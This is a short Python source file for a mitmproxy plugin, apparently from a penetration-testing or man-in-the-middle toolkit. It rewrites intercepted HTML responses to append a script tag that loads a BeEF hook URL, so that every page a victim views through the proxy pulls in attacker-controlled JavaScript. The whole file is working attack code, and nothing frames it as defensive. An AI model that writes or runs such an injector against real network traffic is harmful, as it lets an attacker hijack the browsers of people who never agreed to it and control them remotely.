"""
This module injects the hook.js url from BeEF.
"""
import chardet
from bs4 import BeautifulSoup
from mitmproxy.models import decoded
from mitmplugin import MITMPlugin

class BeEFInjector(MITMPlugin):

    def __init__(self, config):
        super(BeEFInjector, self).__init__(config, "beefinjector")

    def response(self, flow):
        encoding = chardet.detect(flow.response.content)["encoding"]
        html = BeautifulSoup(flow.response.content.decode(encoding, "ignore"), "lxml")
        if html.body:
            script = html.new_tag('script', type='text/javascript', src=self.config["beef_url"])
            html.body.append(script)
            flow.response.content = str(html)
            print "[{}] Injected BeFF url hook in page '{}'...".format(self.name, flow.request.url)
